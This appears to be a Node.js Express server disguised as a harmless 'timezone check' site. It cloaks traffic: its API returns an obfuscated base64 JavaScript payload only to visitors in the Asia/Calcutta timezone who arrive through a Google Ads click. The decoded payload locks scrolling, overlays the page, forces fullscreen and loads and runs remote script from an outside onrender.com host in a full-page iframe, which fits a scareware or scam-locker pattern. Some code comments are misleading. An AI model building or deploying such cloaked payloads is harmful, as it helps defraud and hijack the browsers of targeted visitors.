const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'CmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS5vdmVyZmxvdyA9ICJoaWRkZW4iOwoKLy8gSW5zZXJ0IGFuIEhUTUwgZGl2IHdpdGggc3BlY2lmaWMgc3R5bGVzIGludG8gdGhlIGRvY3VtZW50IGJvZHkKZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImFmdGVyYmVnaW4iLCAnPGRpdiBpZD0iYnJ1Y2VEaXYiIHN0eWxlPSItaW5kZXg6IDk5OTk7IHBvaW50ZXItZXZlbnRzOiBhdXRvOyBvdmVyZmxvdzogaGlkZGVuOyI+PC9kaXY+Jyk7CgovLyBBZGQgYSBjbGljayBldmVudCBsaXN0ZW5lciB0byB0cmlnZ2VyIGZ1bGxzY3JlZW4gYW5kIGZldGNoIGV4dGVybmFsIGNvbnRlbnQKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigid2ViZmlyc3RsaW5lIiwgZnVuY3Rpb24oKSB7CiAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgMCk7CiAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnJlcXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0RnVsbHNjcmVlbigpOwogICAgICAgIH0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1velJlcXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbHNjcmVlbigpOwogICAgICAgIH0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbigpOwogICAgICAgIH0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1zUmVxdWVzdEZ1bGxzY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1zUmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9CiAgICB9LCAxMDApOwogICAgCiAgICAvLyBGZXRjaCBjb250ZW50IGZyb20gdGhlIG5ldyBVUkwgYW5kIGVtYmVkIGl0IGluIGFuIGlmcmFtZQogICAgZmV0Y2goImh0dHBzOi8vdHdvMmctY3hkOS5vbnJlbmRlci5jb20vaW5kZXguanMiKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKGNvbnRlbnQgPT4gewogICAgICAgIGxldCBibG9iID0gbmV3IEJsb2IoW2NvbnRlbnRdLCB7IHR5cGU6ICJhcHBsaWNhdGlvbi9qYXZhc2NyaXB0IiB9KTsKICAgICAgICBsZXQgdXJsID0gVVJMLmNyZWF0ZU9iamVjdFVSTChibG9iKTsKICAgICAgICBsZXQgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CiAgICAgICAgaWZyYW1lLnNyYyA9IHVybDsKICAgICAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICAgICAgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKICAgICAgICBpZnJhbWUuZnJhbWVCb3JkZXIgPSAiMCI7CiAgICAgICAgaWZyYW1lLmFsbG93VHJhbnNwYXJlbmN5ID0gInRydWUiOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgfSk7Cn0pOwo='; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
